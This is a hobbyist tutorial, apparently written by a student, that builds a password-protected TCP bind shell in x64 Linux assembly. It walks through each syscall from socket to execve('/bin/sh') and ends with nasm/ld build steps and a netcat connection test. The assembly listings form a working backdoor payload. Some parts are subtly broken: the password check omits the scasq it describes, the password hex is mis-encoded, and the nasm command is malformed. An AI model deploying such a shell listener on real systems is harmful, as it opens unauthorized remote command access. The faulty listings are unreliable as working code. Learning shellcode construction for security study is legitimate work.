---
title: Bind Shell in x64
---

Since I never read any notes I make (and there are tons of them), the desicion to create this tutorial was made. I am just a student, so do not look at this tutorial as an undeniable truth and a complete guide to the topic. No no no, there is an awful amount of stuff to learn on your own in order to grasp what's happening, AND since this is my 3rd program written in assembly ever, some mistakes may occur. My previous two programs were 'Hello world' and 2 number addition. Furthermore, English is not my first or second language, nor is it a third one, and I refuse to use translator or - GOD FORBID - ai.


### Creating a socket

``` PoC
int socket(int domain, int type, int protocol);
```

'socket' syscall creates an endpoint for communication and returns a file descriptor that refers to it.

1. `domain` argument selects a protocol family for communication. Those are defined in `<sys/socket.h>`. The format used in this case is `AF_INET`.
		`AF_INET` - IPv4 Internet Protocol.

2. `socket` argument indicates the *type*, which specifies the communication semantics.
		`SOCK_STREAM` - provides, reliable, sequensed, 2-way, connection-based byte streams. Sockets of this type are full-duplex byte streams, they do not preserve record boundaries. 
		A stream socket must be in a `connected` state before receiving or accepting any data.
		Protocols with `SOCK_STREAM` ensure that data is not lost or duplicated.

3. `protocol` argument specifies a particular protocol to be used with the socket.
		The choice of a protocol depends on the previous parameters. In this case we use `SOCK_STREAM` as a socket, so the value of `protocol`is 0.


In this case, address family `AF_INET` uses IPv4 protocol implementation. And since the type of socket is `SOCK_STREAM`, and the protocol has a value of 0, we certainly use a TCP socket here.
	`tcp_socket = socket(AF_INET, SOCK_STREAM, 0;`


Assembly code:
``` Assembly x64
global _start

section .text

_start:
	; Socket syscall
		; Calling 'socket' syscall by assigning its decimal number into rax.
		; Then pushing arguments one by one
		; rdi = AF_INET
		; rsi = SOCK_STREAM
		; rdx = 0, because of rsi.

		push 41
		pop rax 

		; 'domain' argument: AF_INET = 2
		push -2
		pop rdi
		neg rdi

		; 'type' argument: SOCK_STREAM = 1
		push rdi
		pop rsi
		dec rsi

		; 'protocol' argument = 0
		xor edx, edx

		; After a 'socket' syscall is closed, a file descriptor 
		; (later is refered to as 'fd') is saved in 'rax' register
		syscall
```

### Binding a socket to a local machine port

Not binded socket exists in a name space (address family), without actual address assigned to it, so the `bind`'s job is to provide this address.

`bind()` associates the socket with its local address.

```PoC
int bind(int sockfd, const struct sockaddr *addr, socklen_t addrlen);
```

This operation is called "Assigning a name to a socket".
1. `sockfd` - the socket reffered by the file.
2. `addr` - the address to be assigned to socket.
3. `addrlen` - the size of the address structure pointed to by `addr` (in bytes).

Usually a `SOCK_STREAM` socket need a local address assignment before receiving any connections.

The structure for the `addr` argument:
```
struct sockaddr {
	sa_family_t sa_family;
	char        sa_data[14];
}
```
Its purpose is to cast the structure pointer passed in `addr` to avoid compiler warnings.


Assembly code:
```Assembly x64
; Bind syscall
	; The number of 'bind' syscall equals to 49 in decimal
	; Before assigning anything to rax, save its value to rdi
	; rdi = fd stored in rax
	; rsi = sockaddr_in
	; rdx = length of rsi

	; store fd in rdi
	push rax
	pop rdi

	; calling 'bind' syscall
	push 49
	pop rax

	; pushing addrlen to rdx
	push 16
	pop rdx

	; Now we are creating a stack
	; first - push rdx 2 times to get 00 in between 0x5c11 and 02
	%rep 2
	push rdx
	%endrep

	; this is a struct of addr
	mov word [rsp+2], 0x5c11 ; stands for port number in hex
	mov byte [rsp], 0x2

	;saving the addr in rsi
	mov rsi, rsp 

	syscall
```

Stack is a not intuitive weird thing. It grows to the bottom. We use stack here to create a struct for `addr` and save the value of stack pointer (SP) into `rsi` register. 

- SP indicates the location of the last value that was put onto the stack.
- SP decreases when an item is put on the stack.
- SP increases when the item is pulled out of the stack.

There is a whole bunch of resourses on the Internet that can help you understand stack and SP better. Here is the one i like as a reminder: www.ee.nmt.edu/~erives/308L_05/The_stack.pdf. There is probably no malware on the page, but - just for the record - I'm not sure!


### Listen for a connection

`listen` syscall marks the socket referred to by `sockfd` as a passive socket, meaning the socket will be accepting incomming connections using `accept` syscall.

```PoC
int listen(int sockfd, int backlog);
```

1. We already know what `sockfd` argument is.
2. `backlog` defines the max length for the queue of socket pending connections.

```Assembly x64
; Listen syscall

	push 50 
	pop rax ; 'listen' syscall number

	; fd is already stored in rdi

	push 1
	pop rsi ; backlog
	syscall
```


### Accept incoming connection

It extracts the first connection on the queue of pending connections for the listening socket, creates a new connected socket, and returns a new fd referring to this socket.

The newly created socket does not listen for a connections.
And the original socket is unaffected.

```PoC
int accept (int sockfd, struct sockaddr *addr, socklen_t *addrlen);
```

1. `sockfd` - a socket that was created with 'socket' syscall, bound to a local address and is listening for a connection.
2. `addr` - a pointer to sockaddr sructure (in our case it is rsi).
3. `addrlen` - value-result argument that contains the size of the struct pointed to by `addr` (in bytes).

```Assembly x64
; Accept syscall

	push 43
	pop rax ; 43 is a decimal for 'accept' syscall

	cdq ; zeroing rdx -- converting to a quadword
	push rdx
	push rdx ; the same stack logic as in 'bind' syscall

	mov rsi, rsp ; client will be stored in rsi 
	push 16 ; size of 'addr'
	lea rdx, [rsp]
	syscall

	; store a client socket descriptor in r9 for later use
	xchg r9, rax
```

### Close a file descriptor

`close` syscall closes a fd, so it does not refer to any file, but may be used again.

```PoC
int close(int fd);
```

```Assembly x64
closefd_syscall:
	
	push 3
	pop rax
	
	; it takes fd as an rdi argument
	; here fd is already in rdi
	
	syscall

; restoring client socket descriptor to rdi

	mov rdi, r9

; jumping to a read_syscall on success
; this will be another point of return

	jz read_syscall
	
; or exit on error
	push 60
	pop rax
	syscall
```

The `closefd_syscall:` is not a comment, but a point to which the program can return (note: the program returns to the point in the code, not in memory).

### Read from a fd

`read` tries to read up to `count` bytes from fd into the buffer starting at `buf`.

```PoC
ssize_t read(int fd, void *buf, size_t count);
```

```Assembly x64
read_syscall:

	xor rax, rax
	
	; rdi client already stored in rdi
	
	; taking user input
	sub rsp, 24
	mov rsi, rsp
	
	push 24
	pop rdx
	
	; user input is stored in rsi
	syscall
```


### Compare password

Here we just add some authentication not in the most reliable way, but just to see a concept.
Do not forget to hexify your password.

```Assembly x64
; Compare password

	; 'urmom\n' = 0x75726D6F6D5C6E
	
	mov rax, 0x75726D6F6D5C6E
	lea rdi, [rsi]
	
	; scasq - instruction that compares 
	mov rdi, r9
	jne closefd_syscall ; if does not match (error in scasq), then close socket	
```


### Duplicate a file descriptor

`dup2` syscall allocates a new fd that refers to the same open fd as the descriptor `oldfd`., where fd `newfd` is adjusted so that it now refers to the same open file description as `oldfd`.

```PoC
int dup2(int oldfd, int newfd);
```


Assembly code:
```Assembly x64
; Duplicate2 syscall

	; rdi client socket
	; rsi must iterate 3 times

	; loop counter
	push 3
	pop rcx

	; fd counter
	push 2
	pop rbx

	dup2:
		push 33
		pop rax
		mov rsi, rbx ; decrementing fd counter
		push rcx ; store loop counter
		syscall
		pop rcx ; restore loop
		loop dup2
```

### Execute a /bin/sh shell

`execve` syscall just executes a program referred to by pathname.

1. `pathname` - a binary executable or with an interpreter script.
2. `argv` - an array of pointers to strings passed to the new program as cmd args.
3. `envp` - an array of pointers to strings of the from *key=value*, which are passed as the environment of the new program. Must be termianted byu null pointer.

```PoC
int execve(const char *pathname, char *const _Nullable argv[], char *const _Nullable envp[]);
```

```Assembly x64
; Execve syscall

	mov rax, 59
	lea rdi, [rel binsh]
	xor rsi, rsi
	push rsi
	pop rdx
	syscall
```

What's a `binsh`? This is a variable that contains a string "/bin/sh". To initialize it, section .data must be implemented:

```Assembly x64
section .data
	binsh db "/bin/sh"
```

### Run and Test that stuff

I will not dive into explainig what `nasm` or `ld` are. 

- `nasm` - an assembler and disassembler for x86.
- `ld` - combines a number of object and archive files.

Run those 2 commands:
1. `nasm -f elf64 -bindshell.o bindshell.s`
2. `ld -o bindshell bindshell.o`

Now we have our program called 'bindshell'. Run in in your terminal, then open another tab and try to connect to it using netcat command:
`nc 127.0.0.1 4444`, and right after it input the password you set. Now to check if it works, run some commands like `id` or `whoami` or `echo "dick"`.

I know, some stuff may be frustrating. It gets worse with time, get used to it :3 
